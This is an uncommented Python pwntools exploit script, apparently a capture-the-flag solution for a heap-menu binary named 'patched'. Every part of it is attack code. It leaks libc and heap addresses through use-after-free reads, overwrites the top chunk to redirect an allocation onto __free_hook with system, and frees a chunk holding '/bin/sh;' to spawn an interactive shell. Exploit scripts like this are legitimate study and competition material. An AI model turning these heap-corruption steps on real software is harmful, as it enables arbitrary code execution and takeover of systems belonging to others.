from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(idx,size,c):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(2)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
context.log_level='debug'
p=process('./patched')
libc=ELF("./patched").libc
add(0,0xe8,"A")
add(1,0x58,"B")
add(2,0x58,"B")
free(0)
add(0,0xe8,"A")
show(0)
base=u64(p.read(8))-(0x7ffff7dd1b41-0x7ffff7a0d000)
free(0)
free(1)
free(2)
add(1,0x58,"A")
show(1)
heap=u64(p.read(8))-(0x41)
log.warning(hex(base))
log.warning(hex(heap))
libc.address=base
one=0xf1147+base
ATM=libc.sym['system']+(libc.sym['__free_hook']-heap-0x100)+1-8
add(0,0x58,p64(ATM)*2)
AIM=0x7ffff7dd1b79-0x7ffff7a0d000+base
add(2,AIM,"B")
p.readuntil(":")
#p *(struct malloc_state *) 0x7ffff0000020
AIM=(base&0xffffffffff0000000)+0x1000000*4+0x8b0-heap-0x100-0x10
log.warning(hex(AIM))
add(2,AIM,"B")
free(0)
free(1)
AIM=(0x7ffff7dd37a8+base-0x7ffff7a0d000)-((base&0xffffffffff0000000)+0x1000000*4+0x8b0)-0x10
add(0,AIM,"/bin/sh;")
#gdb.attach(p)
free(0)
p.interactive()
